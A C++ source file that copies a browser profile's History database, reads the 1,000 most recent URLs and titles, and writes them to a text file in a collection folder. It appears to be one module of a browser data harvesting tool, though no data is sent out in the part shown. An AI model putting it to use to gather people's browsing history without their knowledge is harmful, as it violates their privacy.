//
// Created by .1qxz on 08.06.2024.
//

#include "CHistory.h"

void CHistory::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "History";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<History> history = CHistory::getHistory(copied_db);

    fs::remove(copied_db);

    if(history.empty())
        return;

    std::stringstream ss;

    for(const History &row : history)
    {
        ss << "Title: " << row.title << "\n";
        ss << "Url: " << row.url << "\n";
        ss << "\n";
    }

    Utils::writeFile(root / "History.txt", ss.str(), true);
}

std::list<History> CHistory::getHistory(const fs::path &db_path) {
    std::list<History> history;
    sqlite3* db;
    sqlite3_stmt* stmt;
    int rc;

    rc = sqlite3_open(db_path.string().c_str(), &db);
    if (rc) {
        return {};
    }

    const char* sql = "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 0, 1000";

    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        sqlite3_close(db);
        return {};
    }

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        const unsigned char* title = sqlite3_column_text(stmt, 1);

        History historyRecord;
        historyRecord.url = std::string(reinterpret_cast<const char*>(url));
        historyRecord.title = std::string(reinterpret_cast<const char*>(title));

        history.push_back(historyRecord);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return history;
}
